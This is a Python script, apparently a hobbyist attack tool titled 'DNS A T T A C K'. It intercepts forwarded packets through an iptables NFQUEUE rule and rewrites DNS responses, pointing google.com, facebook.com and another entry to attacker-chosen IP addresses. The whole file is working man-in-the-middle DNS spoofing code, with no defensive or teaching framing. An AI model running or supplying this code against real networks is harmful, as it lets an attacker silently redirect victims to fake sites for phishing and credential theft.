import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

os.system("clear")
print("DNS A T T A C K")
print("\n\n")

class DnsSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict    #list of fake addresses
        self.queueNum = queueNum    #Queue number used in iptables
        self.queue = NetfilterQueue() #Initializes a NetfilterQueue instance


    def __call__(self):     #Runs when you call the object like a function
        log.info("Snoofing....")
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')  #Inserts a rule to redirect packets to NFQUEUE
        self.queue.bind(self.queueNum, self.callBack)

        try:
            self.queue.run()    #Starts processing packets
        except KeyboardInterrupt:
            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")
            #If user presses Ctrl+C, it removes the iptables rule and logs the flush.

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())  #Extracts the raw payload & converts it into a Scapy IP packet.

        if scapyPacket.haslayer(DNSRR):         #Checks if the packet is a DNS response
            try:
                log.info(f'[original] {scapyPacket[DNSRR].summary()}')      #Logs the original DNS answer
                queryName = scapyPacket[DNSQR].qname                        #Extracts the domain name requested
                if queryName in self.hostDict:                  #If domain is targets
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.hostDict[queryName])   #replace dns with fake ip
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    log.info(f'[modified] {scapyPacket[DNSRR].summary()}')      #log modified DNS
                else:
                    log.info(f'[not modified] {scapyPacket[DNSRR].rdata}')
            except IndexError as error:
                log.error(error)
        packet.set_payload(bytes(scapyPacket))      #modify packet
        return packet.accept()

if __name__ == '__main__':
    try:
        hostDict = {
            b"google.com.": "192.168.1.100",
            b"facebook.com.": "192.168.1.100",
            b"METBKC": "199.79.62.93"

        }
        queueNum = 0
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        snoof = DnsSnoof(hostDict, queueNum)                    #Creates an instance DnsSnoof starts attack
        snoof()
    except OSError as error:
        log.error(error)

